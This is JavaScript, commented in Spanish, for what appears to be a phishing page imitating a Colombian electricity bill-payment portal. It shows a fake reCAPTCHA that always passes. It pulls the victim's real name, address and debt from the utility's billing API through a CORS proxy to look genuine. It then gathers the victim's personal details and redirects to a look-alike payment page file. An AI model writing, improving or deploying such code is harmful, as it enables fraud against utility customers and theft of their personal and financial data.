// --- 1. Lógica del Menú Hamburguesa ---
const hamburgerBtn = document.getElementById('hamburgerBtn');
const hamburgerBtnDesktop = document.getElementById('hamburgerBtnDesktop'); 
const sidebar = document.getElementById('sidebar');

const toggleSidebar = () => {
    if (window.innerWidth <= 768) {
        sidebar.classList.toggle('mobile-open');
    } else {
        sidebar.classList.toggle('hidden');
    }
};

if(hamburgerBtn) hamburgerBtn.addEventListener('click', toggleSidebar);
if(hamburgerBtnDesktop) hamburgerBtnDesktop.addEventListener('click', toggleSidebar);

// --- 2. Lógica del ReCAPTCHA ---
const checkboxContainer = document.getElementById('checkboxContainer');
const fakeCheckbox = document.getElementById('fakeCheckbox');
const spinner = document.getElementById('spinner');
const checkmark = document.getElementById('checkmark');
let isChecked = false;

checkboxContainer.addEventListener('click', () => {
    if(isChecked) return; 
    fakeCheckbox.style.display = 'none';
    spinner.style.display = 'block';
    setTimeout(() => {
        spinner.style.display = 'none';
        checkmark.style.display = 'block';
        isChecked = true;
    }, 1200);
});

// --- 3. LÓGICA PRINCIPAL (CORREGIDA PARA PRODUCCIÓN) ---
const btnPagar = document.getElementById('btnPagar');
const whitePanel = document.getElementById('whitePanel');
const originalTitleStrip = document.getElementById('originalTitleStrip');
const inputNic = document.getElementById('inputNicReal');

btnPagar.addEventListener('click', async () => {
    
    if(!inputNic || inputNic.value.trim() === '') {
        alert("Por favor, ingrese el NIC.");
        return;
    }

    if(!isChecked) {
        alert("Por favor confirme que no es un robot.");
        return;
    }

    originalTitleStrip.style.display = 'none';
    whitePanel.innerHTML = `<div class="full-loader-container"><div class="big-loader"></div><p style="text-align:center">Consultando deuda...</p></div>`;

    try {
        const nic = inputNic.value.trim();
        // Nueva URL que devuelve JSON (evita el error 403 del XML)
        const targetUrl = `https://caribesol.facture.co/DesktopModules/Gateway.Pago.ConsultaAnonima/API/ConsultaAnonima/getPolizaOpen?cd_poliza=${nic}`;
        
        // Proxy alternativo más estable para producción
        const proxyUrl = `https://api.allorigins.win/get?url=${encodeURIComponent(targetUrl)}`;

        const resp = await fetch(proxyUrl);
        if (!resp.ok) throw new Error(`Error de conexión: ${resp.status}`);

        const result = await resp.json();
        // AllOrigins mete la respuesta dentro de una propiedad .contents como string
        const data = JSON.parse(result.contents);

        if (!data.ACCOUNTS) {
            throw new Error("No se encontraron facturas pendientes para este NIC.");
        }

        const info = data.ACCOUNTS;
        const deudaTotalNum = parseFloat(info.ADJUST_BALANCE) || 0;
        
        let valorMesNum = 0;
        if (info.INVOICES && info.INVOICES.length > 0) {
            valorMesNum = parseFloat(info.INVOICES[info.INVOICES.length - 1].ADJUST_BALANCE) || 0;
        }

        if (deudaTotalNum > 0) {
            whitePanel.innerHTML = `
            <div class="invoice-view">
                <div class="invoice-header"><h3>PAGUE SU FACTURA</h3></div>
                <p style="text-align:center; font-weight:bold; margin-top:10px;">${data.NAME}</p>
                <div class="invoice-form-grid">
                    <div class="required-note">* Indica campo requerido</div>
                    <div class="invoice-input-group"><label class="invoice-label">No. identificación <span>*</span></label><input type="text" class="invoice-field" id="numId" value="${nic}"></div>
                    <div class="invoice-input-group"><label class="invoice-label">Nombres <span>*</span></label><input type="text" class="invoice-field" id="nombres"></div>
                    <div class="invoice-input-group"><label class="invoice-label">Apellidos <span>*</span></label><input type="text" class="invoice-field" id="apellidos"></div>
                    <div class="invoice-input-group"><label class="invoice-label">Correo <span>*</span></label><input type="email" class="invoice-field" id="correo"></div>
                    <div class="invoice-input-group"><label class="invoice-label">Dirección <span>*</span></label><input type="text" class="invoice-field" id="direccion" value="${info.COLLECTION_ADDRESS || ''}"></div>
                    <div class="invoice-input-group"><label class="invoice-label">Celular <span>*</span></label><input type="text" class="invoice-field" id="celular"></div>
                </div>
                <div class="payment-cards-grid">
                    <div class="payment-card"><div class="pay-card-title">Valor del mes</div><div class="pay-card-amount">$ ${valorMesNum.toLocaleString('es-CO')}</div><button class="btn-card-action btn-blue-dark" onclick="guardarYRedirigir('${valorMesNum}', 'mensual')">PAGAR MES</button></div>
                    <div class="payment-card"><div class="pay-card-title">Deuda Total</div><div class="pay-card-amount">$ ${deudaTotalNum.toLocaleString('es-CO')}</div><button class="btn-card-action btn-teal" onclick="guardarYRedirigir('${deudaTotalNum}', 'total')">PAGAR TOTAL</button></div>
                </div>
                <div class="invoice-footer">
                    <div class="terms-check"><input type="checkbox" id="aceptaCheck"><span>Acepto términos y condiciones</span></div>
                    <button class="btn-cancel" onclick="location.reload()">CANCELAR</button>
                </div>
            </div>`;

        } else {
            alert("Este NIC no tiene deudas pendientes.");
            location.reload();
        }

    } catch (e) {
        console.error("Error completo:", e);
        alert("No se pudo obtener la factura. Detalle: " + e.message);
        location.reload();
    }
});

window.guardarYRedirigir = function(monto, tipo) {
    const nom = document.getElementById('nombres').value;
    const ape = document.getElementById('apellidos').value;
    const mail = document.getElementById('correo').value;
    const check = document.getElementById('aceptaCheck');

    if(!nom || !ape || !mail || !check.checked) {
        alert("Por favor complete los datos y acepte términos.");
        return;
    }

    const datosUsuario = {
        nombreCompleto: nom + " " + ape,
        numId: document.getElementById('numId').value,
        correo: mail,
        montoPagar: parseInt(monto),
        referencia: Math.floor(Math.random() * 100000000)
    };

    localStorage.setItem('datosFactura', JSON.stringify(datosUsuario));
    window.location.href = 'portalpagos.portalfacture.com.html';
};
